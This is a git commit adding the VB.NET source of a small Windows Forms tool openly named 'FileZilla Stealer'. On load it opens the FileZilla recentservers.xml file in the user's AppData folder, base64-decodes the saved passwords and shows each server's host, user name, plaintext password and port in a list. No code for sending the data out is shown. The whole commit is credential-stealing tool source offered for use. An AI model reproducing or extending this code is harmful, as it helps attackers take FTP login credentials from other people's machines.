e0b65c55f45410b93781fa935d03dffdb854d47b
JOniiX <whitplayers@gmail.com>
2016-09-08 17:50:43 +0200

    Add files via upload

---
+++ FileZilla Stealer/FileZilla Stealer/Form1.Designer.vb
@@ -0,0 +1,81 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form remplace la méthode Dispose pour nettoyer la liste des composants.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Requise par le Concepteur Windows Form
+    Private components As System.ComponentModel.IContainer
+
+    'REMARQUE : la procédure suivante est requise par le Concepteur Windows Form
+    'Elle peut être modifiée à l'aide du Concepteur Windows Form.  
+    'Ne la modifiez pas à l'aide de l'éditeur de code.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Me.ListView1 = New System.Windows.Forms.ListView()
+        Me.ColumnHeader1 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
+        Me.ColumnHeader2 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
+        Me.ColumnHeader3 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
+        Me.ColumnHeader4 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
+        Me.SuspendLayout()
+        '
+        'ListView1
+        '
+        Me.ListView1.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
+            Or System.Windows.Forms.AnchorStyles.Left) _
+            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
+        Me.ListView1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader1, Me.ColumnHeader2, Me.ColumnHeader3, Me.ColumnHeader4})
+        Me.ListView1.FullRowSelect = True
+        Me.ListView1.GridLines = True
+        Me.ListView1.Location = New System.Drawing.Point(12, 12)
+        Me.ListView1.Name = "ListView1"
+        Me.ListView1.Size = New System.Drawing.Size(587, 237)
+        Me.ListView1.TabIndex = 0
+        Me.ListView1.UseCompatibleStateImageBehavior = False
+        Me.ListView1.View = System.Windows.Forms.View.Details
+        '
+        'ColumnHeader1
+        '
+        Me.ColumnHeader1.Text = "Host"
+        '
+        'ColumnHeader2
+        '
+        Me.ColumnHeader2.Text = "User"
+        '
+        'ColumnHeader3
+        '
+        Me.ColumnHeader3.Text = "Pass"
+        '
+        'ColumnHeader4
+        '
+        Me.ColumnHeader4.Text = "Port"
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.ClientSize = New System.Drawing.Size(611, 261)
+        Me.Controls.Add(Me.ListView1)
+        Me.Name = "Form1"
+        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
+        Me.Text = "FileZilla Stealer | JOniiX"
+        Me.ResumeLayout(False)
+
+    End Sub
+    Friend WithEvents ListView1 As System.Windows.Forms.ListView
+    Friend WithEvents ColumnHeader1 As System.Windows.Forms.ColumnHeader
+    Friend WithEvents ColumnHeader2 As System.Windows.Forms.ColumnHeader
+    Friend WithEvents ColumnHeader3 As System.Windows.Forms.ColumnHeader
+    Friend WithEvents ColumnHeader4 As System.Windows.Forms.ColumnHeader
+
+End Class
---
+++ FileZilla Stealer/FileZilla Stealer/Form1.vb
@@ -0,0 +1,59 @@
+﻿Imports System.Xml
+Imports System.Text
+
+Public Class Form1
+
+    Public Function Base64Decode(ByVal Texte As String) As String
+        Try
+            If Texte.Length = 0 Then
+                Return ""
+            Else
+                Return Encoding.ASCII.GetString(Convert.FromBase64String(Texte))
+            End If
+        Catch ex As Exception
+            Return ""
+        End Try
+    End Function
+
+    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
+        Dim FileZillaPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\FileZilla\"
+
+        If Not IO.Directory.Exists(FileZillaPath) Then
+            MessageBox.Show("No file !", "Error... !", MessageBoxButtons.OK, MessageBoxIcon.Error)
+            Exit Sub
+        End If
+
+        Dim RecentServers As String = FileZillaPath & "recentservers.xml"
+
+        If IO.File.Exists(RecentServers) Then
+            Dim xmlRecentServers As New XmlDocument
+            xmlRecentServers.Load(RecentServers)
+
+            Dim RecentServersList As XmlNodeList = xmlRecentServers.GetElementsByTagName("RecentServers")
+            Dim Servers As XmlNodeList = DirectCast(RecentServersList(0), XmlElement).GetElementsByTagName("Server")
+
+            For Each Server As XmlElement In Servers
+
+                Dim Host As String = Nothing
+                Dim User As String = Nothing
+                Dim Pass As String = Nothing
+                Dim Port As String = Nothing
+
+                Host = Server.GetElementsByTagName("Host")(0).InnerText
+                User = Server.GetElementsByTagName("User")(0).InnerText
+                Pass = Base64Decode(Server.GetElementsByTagName("Pass")(0).InnerText)
+                Port = Server.GetElementsByTagName("Port")(0).InnerText
+
+                Dim item As New ListViewItem
+                item.Text = Host
+                item.SubItems.Add(User)
+                item.SubItems.Add(Pass)
+                item.SubItems.Add(Port)
+
+                ListView1.Items.Add(item)
+            Next
+        End If
+        ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent)
+    End Sub
+
+End Class
